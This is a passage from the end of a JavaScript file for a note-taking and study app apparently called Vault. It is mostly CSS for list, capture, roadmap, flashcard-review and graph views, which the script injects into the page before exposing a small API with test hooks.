.vt-plist{max-height:55vh; overflow-y:auto;}
.vt-pi{display:block; width:100%; background:transparent; border:none; border-bottom:2px solid var(--line); color:var(--fg); font:inherit; text-align:left; padding:.55rem 1rem; cursor:pointer;}
.vt-pi:last-child{border-bottom:none;}
.vt-pi b{display:block; font-size:.78rem;}
.vt-pi small{display:block; font-size:.66rem; color:var(--muted); margin-top:.15rem; overflow:hidden; text-overflow:ellipsis; white-space:nowrap;}
.vt-pi small mark{background:transparent; color:var(--accent);}
.vt-pi.on{background:#1a1a1a; box-shadow:inset 3px 0 0 var(--accent);}
.vt-pcmd{color:var(--muted); font-weight:400;}
.vt-pi.on .vt-pcmd{color:var(--fg);}
.vt-pempty{padding:.8rem 1rem; margin:0;}
.vt-cap{padding:.9rem 1rem 1rem;}
.vt-caphead{font-size:.62rem; letter-spacing:.14em; text-transform:uppercase; color:var(--accent); font-weight:700; margin-bottom:.6rem;}
.vt-capin{width:100%; resize:vertical; line-height:1.55; font-size:.8rem;}
.vt-capimg{display:flex; align-items:flex-end; gap:.5rem;}
.vt-capimg img{max-height:120px; max-width:60%; border:2px solid var(--line); margin-top:.5rem;}
.vt-capitem{border:2px solid var(--line); padding:.7rem .8rem; margin-bottom:.7rem;}
.vt-caphead2{display:flex; justify-content:space-between; gap:1rem; align-items:baseline; font-size:.76rem; margin-bottom:.4rem;}
.vt-capbody{font-size:.76rem; max-height:20rem; overflow:auto;}
.vt-capitem .vt-relin{max-width:14rem; font-size:.66rem; padding:.25rem .4rem;}
.vt-lightbox{position:fixed; inset:0; z-index:500; background:rgba(0,0,0,.88); display:flex; align-items:center; justify-content:center; cursor:zoom-out; padding:2rem;}
.vt-lbfig{margin:0; display:flex; flex-direction:column; align-items:center; gap:.6rem; max-width:calc(100% - 7rem); max-height:100%;}
.vt-lbfig img{max-width:100%; max-height:calc(100vh - 7rem); border:2px solid var(--fg); background:#fff;}
.vt-lbcap{font-size:.74rem; color:var(--fg); letter-spacing:.04em; text-align:center;}
.vt-lbnav{flex:0 0 auto; background:transparent; border:2px solid var(--line); color:var(--fg); font:inherit; font-size:1.4rem; width:2.8rem; height:2.8rem; cursor:pointer; margin:0 .4rem;}
.vt-lbnav:hover{border-color:var(--accent); color:var(--accent);}

/* roadmap */
.vt-mods{display:flex; flex-direction:column;}
.vt-mod{display:grid; grid-template-columns:3rem minmax(10rem, 1fr) auto auto 12rem 1.6rem; align-items:center; gap:.8rem; border-bottom:2px solid var(--line); padding:.4rem 0;}
.vt-mexp{background:transparent; border:none; color:var(--muted); font:inherit; font-size:.64rem; cursor:pointer; text-align:left; padding:0; white-space:nowrap;}
.vt-mexp:hover{color:var(--fg);}
.vt-mod.s-done .vt-mexp, .vt-mod.s-reviewed .vt-mexp{color:var(--accent);}
.vt-mname{background:transparent; border:none; border-bottom:2px solid transparent; color:var(--fg); font:inherit; font-size:.78rem; padding:.15rem 0; outline:none; min-width:0; width:100%;}
.vt-mname:focus{border-bottom-color:var(--accent);}
.vt-mod.s-reviewed .vt-mname{color:var(--muted);}
.vt-mnotes{white-space:nowrap; overflow:hidden; text-overflow:ellipsis; min-width:0;}
.vt-mcell{display:flex; align-items:center; gap:.3rem; min-width:0;}
.vt-study{color:var(--accent); white-space:nowrap;}
.vt-study:hover{color:var(--fg);}
.vt-mdetail{display:grid; grid-template-columns:minmax(0, 1fr) minmax(0, 1fr); gap:1.4rem; padding:.7rem 0 1rem 3.8rem; border-bottom:2px solid var(--line);}
.vt-topics{display:flex; flex-direction:column; gap:.2rem; margin-bottom:.4rem;}
.vt-topic{display:flex; align-items:center; gap:.55rem; font-size:.74rem;}
.vt-topic .vt-chk{margin-top:0;}
.vt-topic.done span{color:var(--muted); text-decoration:line-through; text-decoration-color:var(--accent);}
.vt-topic .vt-x{margin-left:auto;}
.vt-topicin{width:100%; max-width:20rem; font-size:.7rem; padding:.25rem .4rem;}
.vt-addmod{margin-top:.8rem;}
.vt-addmod .vt-in{width:100%; max-width:24rem;}

/* review */
.vt-rstart{display:flex; align-items:center; gap:.8rem; flex-wrap:wrap; margin-bottom:2rem;}
.vt-soon{display:flex; gap:.5rem; align-items:flex-end;}
.vt-sday{display:flex; flex-direction:column; align-items:center; gap:.2rem; width:3rem; font-size:.6rem; color:var(--muted);}
.vt-sday b{color:var(--fg); font-size:.7rem;}
.vt-sbar{width:100%; height:70px; border-bottom:2px solid var(--fg); display:flex; align-items:flex-end;}
.vt-sbar i{display:block; width:100%; background:var(--accent);}
.vt-rprog{display:flex; justify-content:space-between; align-items:center; font-size:.7rem; color:var(--muted); letter-spacing:.08em; margin-bottom:.6rem;}
.vt-rcard{border:2px solid var(--fg); box-shadow:8px 8px 0 var(--line); padding:2rem 1.6rem; min-height:12rem; display:flex; flex-direction:column; justify-content:center; gap:1.1rem; cursor:pointer; max-width:52rem;}
.vt-rnote{cursor:default; justify-content:flex-start; gap:.5rem;}
.vt-rq{font-size:1.12rem; font-weight:700; line-height:1.5;}
.vt-ra{font-size:.95rem; border-top:2px solid var(--line); padding-top:1.1rem; color:#d0d0d0;}
.vt-rsec{border-top:2px solid var(--line); padding:.45rem 0;}
.vt-rsech{background:transparent; border:none; color:var(--fg); font:inherit; font-size:.82rem; font-weight:700; cursor:pointer; padding:0; text-align:left;}
.vt-rsech:hover{color:var(--accent);}
.vt-rsec.open .vt-md{margin-top:.5rem;}
.vt-rbtns{display:flex; gap:.5rem; margin:1.4rem 0 .8rem; flex-wrap:wrap;}
.vt-grade{display:flex; flex-direction:column; align-items:flex-start; gap:.15rem; min-width:7rem; padding:.55rem .8rem;}
.vt-grade b{font-size:.74rem;}
.vt-grade small{font-size:.6rem; color:var(--muted); letter-spacing:.06em; text-transform:none;}
.vt-grade.g0{border-color:var(--accent);}
.vt-grade.g0 b{color:var(--accent);}
.vt-grade.g2{border-color:var(--fg);}
.vt-rsrc{font-size:.66rem; color:var(--muted);}
.vt-rdone{max-width:30rem;}

/* graph */
.vt-gwrap{position:relative; border:2px solid var(--line);}
.vt-gc{display:block; width:100%; height:min(640px, 72vh); touch-action:none;}
.vt-ghint{position:absolute; left:.6rem; bottom:.4rem; pointer-events:none;}

@media (max-width:1100px){
  .vt-mod{grid-template-columns:3rem minmax(8rem, 1fr) auto auto 1.6rem; row-gap:.3rem;}
  .vt-mod .vt-mcell{grid-column:2 / span 3;}
  .vt-fields{grid-template-columns:repeat(2, minmax(0, 1fr));}
}
@media (max-width:900px){
  .vt-two, .vt-mdetail, .vt-rawgrid{grid-template-columns:1fr; gap:0;}
  .vt-mdetail{padding-left:0; gap:.8rem;}
  .vt-panes.m-split{grid-template-columns:1fr;}
  .vt-panes.m-split .vt-prev{border-left:none; border-top:2px solid var(--line); padding:1rem 0 0;}
  .vt-rell{flex-basis:100%;}
}
@media (max-width:800px){
  .vt-lib{grid-template-columns:1fr;}
  .vt-lib .vt-ed{display:none;}
  .vt-lib.show-ed .vt-ed{display:block;}
  .vt-lib.show-ed .vt-side{display:none;}
  .vt-lib.nolist .vt-side{display:flex;}
  .vt-side{position:static; max-height:none;}
  .vt-back{display:inline-block;}
  .vt-mod{grid-template-columns:3rem 1fr 1.6rem;}
  .vt-mod .vt-mst, .vt-mod .vt-conf, .vt-mod .vt-mcell{grid-column:2;}
  .vt-acts{width:100%;}
  .vt-fields{grid-template-columns:1fr 1fr;}
}
`;
var style = document.createElement("style");
style.textContent = css;
document.head.appendChild(style);

window.Vault = { normalize:normalize, fresh:fresh, hasData:hasData, mount:mount, attach:attach, show:show,
  // exposed for tests
  _test:{ render:render, scanBody:scanBody, inline:inline, hl:hl, nextState:nextState, cardSplit:cardSplit, cells:cells,
          parseReq:parseReq, parseRes:parseRes, findings:findings, sections:sections, buildIndex:buildIndex, cosine:cosine } };
})();
